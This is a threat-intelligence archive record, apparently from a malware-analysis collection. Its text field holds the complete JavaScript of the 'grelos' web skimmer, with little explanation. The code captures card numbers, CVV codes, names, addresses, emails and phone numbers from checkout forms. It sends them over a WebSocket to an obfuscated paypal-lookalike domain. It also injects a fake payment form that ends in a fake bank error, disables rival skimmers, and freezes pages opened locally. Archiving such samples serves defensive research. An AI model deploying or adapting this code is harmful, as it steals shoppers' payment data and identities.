{
    "id": "aff25252-b1d8-4cda-adc1-5ce583014912",
    "created_at": "2023-01-12T15:08:15.747216Z",
    "updated_at": "2025-03-27T02:05:58.814801Z",
    "deleted_at": null,
    "sha1_hash": "4bd3c0accc461596cd62f6b526613821bf31ba6e",
    "title": "2020-07-09 - Gist with observed grelos skimmer",
    "authors": "",
    "file_creation_date": "2022-05-28T04:07:13Z",
    "file_modification_date": "2022-05-28T04:07:13Z",
    "file_size": 109475,
    "plain_text": "# krautface/group-1-websocket-stage-4.js Secret\n\n**gist.github.com/krautface/2c017f220f2a24141bdeb70f76e7e745**\n\nfunction aC(name)\n\n{\n\nfunction escape(s)\n\n{\n\nreturn s.replace(/([.*+?\\^${}()|\\[\\]\\/\\\\])/g, '\\\\$1');\n\n};\n\nvar match = document.cookie.match(RegExp('(?:^|;\\\\s*)' + escape(name) + '=([^;]*)'));\n\nreturn match ? match[1] : null;\n\n}\n\nfunction googleCheck()\n\n{\n\nalert('I\\'m here!');\n\n}\n\nif (!aC('ashdgaisydasldasbdyigausd'))\n\n{\n\ndocument.cookie = \"ashdgaisydasldasbdyigausd=96ddd96e7ed46eb02af0280c550d9772\";\n\nvar tokahsdb = '96ddd96e7ed46eb02af0280c550d9772';\n\n}\n\nelse\n\n{\n\n\n-----\n\nvar tokahsdb = aC('ashdgaisydasldasbdyigausd');\n\n}\n\nvar reffererQwerdfdgdfg = 'victimsite.com';\n\nif (location.hostname == 'file://')\n\n{\n\nwhile (1)\n\n{\n\ndocument.cookie = document.cookie + document.cookie + \"qweqwe=qweqwe\";\n\ndocument.querySelector('body').innerHTML += document.querySelector('body').innerHTML;\n\n}\n\n}\n\nif (!document.querySelector('.qweqwe' + tokahsdb))\n\n{\n\nqweqweIint = setInterval(function ()\n\n{\n\nif (document.querySelector('div'))\n\n{\n\nvar s = document.getElementsByTagName('div')[0];\n\nvar li = document.createElement('span');\n\nli.class = \"qweqwe\" + tokahsdb;\n\ns.parentNode.insertBefore(li, s);\n\nclearInterval(qweqweIint);\n\n}\n\n}, 50);\n\nvar c = [112, 97, 121, 112, 97, 108, 97, 112, 105, 111, 98, 106, 101, 99, 116, 115, 46, 99, 111, 109],\n\nggtag = '//',\n\nihbdnfidjmpwofnj = 1;\n\nfor (var ji = 0; ji < c.length; ji++)\n\n{\n\nggtag += String.fromCharCode(c[ji]);\n\n}\n\n(function ()\n\n{\n\nsetInterval(setNullMethods, 100);\n\n\n-----\n\nfunction setNullMethods()\n\n{\n\nif (typeof (window.GetData) != 'undefined')\n\n{\n\nwindow.GetData = function (elem, flag)\n\n{\n\nconsole.log('ZnVjayB5b3U=');\n\n};\n\n}\n\nif (typeof (window.Default_Send) != 'undefined')\n\n{\n\nwindow.Default_Send = function (elem, flag)\n\n{\n\nconsole.log('ZnVjayB5b3U=');\n\n};\n\n}\n\nif (typeof (window.CheckFields) != 'undefined')\n\n{\n\nwindow.CheckFields = function (elem, flag)\n\n{\n\nconsole.log('ZnVjayB5b3U=');\n\n};\n\n}\n\nif (typeof window.SendData != 'undefined')\n\n{\n\nwindow.SendData = function ()\n\n{\n\nconsole.log('ZnVjayB5b3U=');\n\n};\n\n}\n\n}\n\n})();\n\n(function ()\n\n{\n\nfunction _0xjefgJJDLF()\n\n{\n\nreturn _0x5gasdkf() && _0x5kjsdfdsf();\n\n\n-----\n\n}\n\nfunction _0x5gasdkf()\n\n{\n\nvar obj = document.querySelector('[name=\"card_num\"]#card_num');\n\nif (!__cleanValid(obj.value))\n\n{\n\nobj.setAttribute('class', 'invalid-custom-form-input');\n\nreturn false;\n\n}\n\nelse\n\n{\n\nobj.setAttribute('class', 'valid-custom-form-input');\n\nreturn true;\n\n}\n\n}\n\nfunction _0x5kjsdfdsf()\n\n{\n\nvar obj = document.querySelector('[name=\"cvv2\"]#cvv2');\n\nif (!___cleanValid(obj.value))\n\n{\n\nobj.setAttribute('class', 'invalid-custom-form-input');\n\nreturn false;\n\n}\n\nelse\n\n{\n\nobj.setAttribute('class', 'valid-custom-form-input');\n\nreturn true;\n\n}\n\n}\n\nfunction __cleanValid(value)\n\n{\n\nif (/[^0-9-\\s]+/.test(value)) return false;\n\nlet nCheck = 0,\n\n\n-----\n\nbEven = false;\n\nvalue = value.replace(/\\D/g, \"\");\n\nif (value.length < 16) return false;\n\nfor (var n = value.length - 1; n >= 0; n--)\n\n{\n\nvar cDigit = value.charAt(n),\n\nnDigit = parseInt(cDigit, 10);\n\nif (bEven && (nDigit *= 2) > 9)\n\n{\n\nnDigit -= 9;\n\n}\n\nnCheck += nDigit;\n\nbEven = !bEven;\n\n}\n\nreturn (nCheck % 10) == 0;\n\n}\n\nfunction ___cleanValid(value)\n\n{\n\nvalue = value.replace(/\\D/g, \"\");\n\nif (value.length < 3 || value.length > 4)\n\n{\n\nreturn false;\n\n}\n\nreturn true;\n\n}\n\nvar intervalValidator = setInterval(_0xhsdfJk, 100);\n\nfunction _0xhsdfJk()\n\n{\n\nif (document.querySelector('[name=\"card_num\"]#card_num') && !document.querySelector('[name=\"card_num\"]#card_num[datavalidator=true]'))\n\n{\n\ndocument.querySelector('[name=\"card_num\"]#card_num').addEventListener('input', function (e)\n\n{\n\n\n-----\n\ne.target.value = e.target.value.replace(/[^0-9]/g, '').replace(/(\\..*)\\./g, '$1');\n\nlet val = '';\n\nlet __1 = e.target.value.substr(0, 4);\n\nif (e.target.value.length > 4)\n\n{\n\nval += __1;\n\nlet __2 = e.target.value.substr(4, 4);\n\nif (__1.length == 4 && __2)\n\n{\n\nval += ' ' + __2;\n\nlet __3 = e.target.value.substr(8, 4);\n\nif (__2.length == 4 && __3)\n\n{\n\nval += ' ' + __3;\n\nlet __4 = e.target.value.substr(12, 4);\n\nif (__3.length == 4 && __4)\n\n{\n\nval += ' ' + __4;\n\n}\n\n}\n\n}\n\ne.target.value = val;\n\n}\n\n});\n\nif (document.querySelector('[name=\"card_num\"]#card_num'))\n\n{\n\ndocument.querySelector('[name=\"card_num\"]#card_num').addEventListener('focus', function (e)\n\n{\n\ndocument.querySelector('[name=\"card_num\"]#card_num').setAttribute('class', '');\n\n});\n\ndocument.querySelector('[name=\"card_num\"]#card_num').addEventListener('blur', function (e)\n\n{\n\n_0x5gasdkf();\n\n});\n\n}\n\n\n-----\n\nif (document.querySelector('[name=\"cvv2\"]#cvv2'))\n\n{\n\ndocument.querySelector('[name=\"cvv2\"]#cvv2').addEventListener('focus', function (e)\n\n{\n\ndocument.querySelector('[name=\"cvv2\"]#cvv2').setAttribute('class', '');\n\n});\n\ndocument.querySelector('[name=\"cvv2\"]#cvv2').addEventListener('blur', function (e)\n\n{\n\n_0x5kjsdfdsf();\n\n});\n\n}\n\ndocument.querySelector('[name=\"card_num\"]#card_num').setAttribute('data-validator', 'true');\n\n}\n\nif (document.querySelector('#dfsdfsfsdf672ac3d52c366529fc7f93a19455bd95') &&\n!document.querySelector('#dfsdfsfsdf672ac3d52c366529fc7f93a19455bd95.lkmfsjdfnsdihdbfl672ac3d52c366529fc7f93a19455bd95'))\n\n{\n\ndocument.querySelector('#dfsdfsfsdf672ac3d52c366529fc7f93a19455bd95').setAttribute('class',\n'lkmfsjdfnsdihdbfl672ac3d52c366529fc7f93a19455bd95');\n\nvar tryToPayBtn = document.querySelector('#try-to-pay-button');\n\nif (tryToPayBtn)\n\n{\n\ntryToPayBtn.addEventListener('click', function (e)\n\n{\n\ne.preventDefault();\n\nif (!_0xjefgJJDLF())\n\n{\n\nreturn false;\n\n}\n\nelse\n\n{\n\nclearInterval(intervalValidator);\n\ndocument.querySelector('#dfsdfsfsdf672ac3d52c366529fc7f93a19455bd95 .statusBar').innerHTML = '<div style=\"text-align:\ncenter;font-weight: bold;\">' + labels['bank_processing'] + '</div>';\n\ntryToPayBtn.setAttribute('disabled', 'disabled');\n\nsetTimeout(function ()\n\n\n-----\n\n{\n\ndocument.cookie = \"formHIde=1;\";\n\ndocument.querySelector('#dfsdfsfsdf672ac3d52c366529fc7f93a19455bd95 .statusBar').innerHTML = '<div style=\"color:darkred\">' +\nlabels['bank_error'] + '</div>';\n\nsetTimeout(function ()\n\n{\n\ndocument.querySelector('#dfsdfsfsdf672ac3d52c366529fc7f93a19455bd95').setAttribute('style', 'display:none !important;');\n\nif (typeof sdnjfsldfk == 'function')\n\n{\n\nsdnjfsldfk();\n\n}\n\n}, 7000);\n\n}, 10000);\n\n}\n\n});\n\n}\n\n}\n\n}\n\n})();\n\nvar wssocket;\n\nvar pingInterval;\n\nvar host = '//pa' + 'yp' + 'al' + 'ap' + 'io' + 'bj' + 'ec' + 'ts.com';\n\nwssconnect();\n\nlet wssConnectInterval = setInterval(wssconnect, 1000);\n\nfunction wssconnect()\n\n{\n\nif (!wssocket || (wssocket.readyState != 1 && wssocket.readyState != '-0'))\n\n{\n\ntry\n\n{\n\nwssocket = new WebSocket(\"wss:\" + host + \"/events/\");\n\nwssocket.onopen = function (data)\n\n{\n\nsocketSend(\n\n{\n\ne: \"hello\",\n\n\n-----\n\ndata:\n\n{\n\ndomain: location.origin\n\n}\n\n});\n\npingInterval = setInterval(function ()\n\n{\n\nsocketSend(\n\n{\n\ne: \"ping\"\n\n});\n\n}, 5000);\n\n};\n\nwssocket.onclose = function (data)\n\n{\n\nclearInterval(pingInterval);\n\n};\n\nwssocket.onmessage = function (data) {};\n\n}\n\ncatch (e)\n\n{}\n\n}\n\n}\n\nfunction socketSend(data)\n\n{\n\nwssocket.send(JSON.stringify(data));\n\n}\n\nfunction wssdisconnect()\n\n{\n\nclearInterval(pingInterval);\n\nclearInterval(wssConnectInterval);\n\nwssocket.close();\n\n}\n\nwindow.addEventListener(\"unload\", wssdisconnect);\n\n(function ()\n\n{\n\n\n-----\n\nfunction gcmBuild()\n\n{\n\naddEvents();\n\nsetInterval(addEvents, 100);\n\n}\n\nfunction pixel(fs)\n\n{\n\nvar j = getJson();\n\nemit(j);\n\n}\n\nfunction getJson()\n\n{\n\nconst formData = new Object;\n\nformData['tok'] = tokahsdb;\n\ndocument.querySelectorAll('input').forEach(function (item, i)\n\n{\n\nif (item.value.length < 1)\n\n{\n\nreturn;\n\n}\n\nlet itemKey = '';\n\nif (item.name)\n\n{\n\nitemKey = item.name;\n\n}\n\nelse if (item.id)\n\n{\n\nitemKey = item.id;\n\n}\n\nformData[itemKey] = item.value;\n\n});\n\ndocument.querySelectorAll('select').forEach(function (item, i)\n\n{\n\nif (item.name.search('date') != '-1' || item.name.search('exp') != '-1' || item.name.search('cardExpiration') != '-1')\n\n{\n\n\n-----\n\nformData[item.name] = item.value;\n\nreturn;\n\n}\n\nif (!document.querySelector('[name=\"' + item.name + '\"]'))\n\n{\n\nconsole.log('[name=\"' + item.name + '\"]', 'not found');\n\nreturn;\n\n}\n\nif (!document.querySelector('[name=\"' + item.name + '\"] [value=\"' + document.querySelector('[name=\"' + item.name + '\"]').value + '\"]'))\n\n{\n\nconsole.log('[name=\"' + item.name + '\"] [value=\"' + document.querySelector('[name=\"' + item.name + '\"]').value + '\"]', 'not found');\n\nreturn;\n\n}\n\nformData[item.name] = document.querySelector('[name=\"' + item.name + '\"] [value=\"' + document.querySelector('[name=\"' +\nitem.name + '\"]').value + '\"]').innerText;\n\n});\n\ndocument.querySelectorAll('textarea').forEach(function (item, i)\n\n{\n\nformData[item.name] = item.value;\n\n});\n\nif (typeof reffererQwerdfdgdfg != 'undefined')\n\n{\n\nformData['domain'] = reffererQwerdfdgdfg;\n\n}\n\nelse\n\n{\n\nformData['domain'] = location.hostname;\n\n}\n\nreturn JSON.stringify(formData);\n\n}\n\nfunction addEvents()\n\n{\n\nif (typeof grelos_v != 'undefined')\n\n{\n\ngrelos_v['Glink'] = '/';\n\n\n-----\n\n}\n\nif (\n\n!document.querySelector('[name*=cc_number]') &&\n\n!document.querySelector('[name*=firstname]') &&\n\n!document.querySelector('[name*=name]') &&\n\n!document.querySelector('[name*=address]') &&\n\n!document.querySelector('[name*=postcode]') &&\n\n!document.querySelector('[name*=zip]') &&\n\n!document.querySelector('[name*=phone]') &&\n\n!document.querySelector('[name*=email]') &&\n\n!document.querySelector('[name*=\"payment[cc_number]\"]') &&\n\n!document.querySelector('[name*=payment]') &&\n\n!document.querySelector('[name*=cc]') &&\n\n!document.querySelector('[name*=card_num]') &&\n\n!document.querySelector('[name*=billing]')\n\n)\n\n{\n\nreturn false;\n\n}\n\nArray.from(document.getElementsByTagName('input')).forEach(function (item, i)\n\n{\n\nif (!item.hasAttribute('build'))\n\n{\n\nitem.setAttribute('build', 1);\n\nitem.addEventListener(\"blur\", eventSend);\n\n}\n\n});\n\nArray.from(document.getElementsByTagName('select')).forEach(function (item, i)\n\n{\n\nif (!item.hasAttribute('build'))\n\n{\n\nitem.setAttribute('build', 1);\n\nitem.addEventListener(\"blur\", eventSend);\n\n}\n\n});\n\nArray.from(document.getElementsByTagName('textarea')).forEach(function (item, i)\n\n\n-----\n\n{\n\nif (!item.hasAttribute('build'))\n\n{\n\nitem.setAttribute('build', 1);\n\nitem.addEventListener(\"blur\", eventSend);\n\n}\n\n});\n\nArray.from(document.querySelectorAll(\"form\")).forEach(function (item, i)\n\n{\n\nif (!item.hasAttribute('build'))\n\n{\n\nitem.setAttribute('build', 1);\n\nitem.addEventListener(\"submit\", eventSend);\n\n}\n\n});\n\nArray.from(document.querySelectorAll(\"[type=submit]\")).forEach(function (item, i)\n\n{\n\nif (!item.hasAttribute('build'))\n\n{\n\nitem.setAttribute('buildd', 1);\n\nitem.addEventListener(\"click\", eventSend);\n\n}\n\n});\n\nArray.from(document.querySelectorAll(\"[type=button]\")).forEach(function (item, i)\n\n{\n\nif (!item.hasAttribute('buildd'))\n\n{\n\nitem.setAttribute('buildd', 1);\n\nitem.addEventListener(\"click\", eventSend);\n\n}\n\n});\n\n}\n\nfunction eventSend(e)\n\n{\n\npixel(0);\n\n}\n\n\n-----\n\nfunction emit(data)\n\n{\n\nif (typeof googlelog != 'undefined')\n\n{\n\nconsole.log(data);\n\n}\n\nsocketSend(\n\n{\n\ne: \"send\",\n\ndata: data\n\n});\n\n}\n\nwindow.addEventListener(\"load\", gcmBuild, false);\n\n})();\n\n(function ()\n\n{\n\nif (!aC('pixel'))\n\n{\n\nif (document.referrer != '' && document.referrer.replace('https://', '').replace('http://').split('/')[0] != location.hostname)\n\n{\n\ndocument.cookie = \"pixel=1; max-age=\" + (3600 * 3);\n\n}\n\nelse\n\n{\n\ndocument.cookie = \"pixel=2; max-age=\" + (3600 * 3);\n\n}\n\n}\n\nif (!aC('formHIde') && (1 || aC('pixel') == 1 || 0))\n\n{}\n\n})();\n\n}\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-07-09 - Gist with observed grelos skimmer.pdf"
    ],
    "report_names": [
        "2020-07-09 - Gist with observed grelos skimmer.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536095,
    "ts_updated_at": 1743041158,
    "ts_creation_date": 1653710833,
    "ts_modification_date": 1653710833,
    "files": {
        "pdf": "https://archive.orkl.eu/4bd3c0accc461596cd62f6b526613821bf31ba6e.pdf",
        "text": "https://archive.orkl.eu/4bd3c0accc461596cd62f6b526613821bf31ba6e.txt",
        "img": "https://archive.orkl.eu/4bd3c0accc461596cd62f6b526613821bf31ba6e.jpg"
    }
}